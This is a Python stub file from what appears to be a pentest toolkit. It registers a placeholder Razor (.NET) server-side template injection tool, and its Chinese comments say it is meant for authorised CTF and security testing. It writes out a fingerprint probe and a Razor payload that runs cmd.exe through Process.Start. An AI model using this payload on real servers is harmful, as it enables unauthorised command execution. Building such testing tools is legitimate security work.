"""Razor SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: @(7*7)→49。
RCE: 需注入到 .cshtml 代码区: @System.Diagnostics.Process.Start("cmd.exe","/c whoami")

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiRazorTool(SstiEngineTool):
    name = "ssti_razor"
    description = "Razor(.NET) SSTI:注入 .cshtml 代码区 Process.Start 执行(占位符)"
    engine_key = "razor"
    engine_name = "Razor"
    default_mode = "exec"
    plan = r"""指纹: @(7*7)→49。
RCE: 需注入到 .cshtml 代码区: @System.Diagnostics.Process.Start("cmd.exe","/c whoami")"""
